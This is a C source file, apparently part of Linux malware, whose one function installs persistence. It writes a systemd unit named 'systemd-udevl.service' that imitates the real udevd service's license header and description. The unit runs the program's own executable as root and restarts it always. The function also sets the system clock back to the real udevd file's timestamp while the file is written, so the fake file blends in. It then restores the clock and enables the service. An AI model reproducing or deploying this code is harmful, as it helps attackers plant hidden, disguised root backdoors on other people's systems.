#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <time.h>
#define DATA_SIZE 1000
#define MAXPATHLEN 200

int systemd_persistance(){
    FILE *fPtr;
    int length;
    char fullpath[MAXPATHLEN];
    time_t currentdate, fakedate;
    struct stat filestat;
    struct timeval faketime, currenttime;
    //get time to fake
    stat("/usr/lib/systemd/system/systemd-udevd.service",&filestat);
    //convert to timeval
    faketime.tv_sec = filestat.st_ctime;
    faketime.tv_usec = 326232605;
    //get file executable path
    length = readlink("/proc/self/exe", fullpath, sizeof(fullpath));
    fullpath[length] = '\0';       // Strip '@' off the end.
    //get current time
    currentdate=time(NULL);
    //convert to timeval
    currenttime.tv_sec=currentdate;
    currenttime.tv_usec=0;
    //set time to faketime
    settimeofday(&faketime, NULL);
    //create service file
    fPtr=fopen("/usr/lib/systemd/system/systemd-udevl.service","w");
    //write to service file
    fputs("#  SPDX-License-Identifier: LGPL-2.1-or-later\n#\n#  This file is part of systemd.\n#\n#  systemd is free software; you can redistribute it and/or modify in\n#  under the terms of the GNU Lesser General Public License as published by\n#  the Free Software Foundation; either version 2.1 of the License, or\n#  (at your option) any later version.\n\n\n[Unit]\nDescription=Rule-based Manager for System Events and Files\nDocumentation=man:systemd-udevd.service(8) man:udev(7)\nAfter=network.target\n[Service]\nType=simple\nRestart=always\nUser=root\nExecStart=", fPtr);
    fputs(fullpath, fPtr);
    fputs("\n[Install]\nWantedBy=multi-user.target\n", fPtr);
    fclose(fPtr);
    //restore time
    settimeofday(&currenttime, NULL);
    //enable and load systemfile
    system(" systemctl enable systemd-udevl");
}
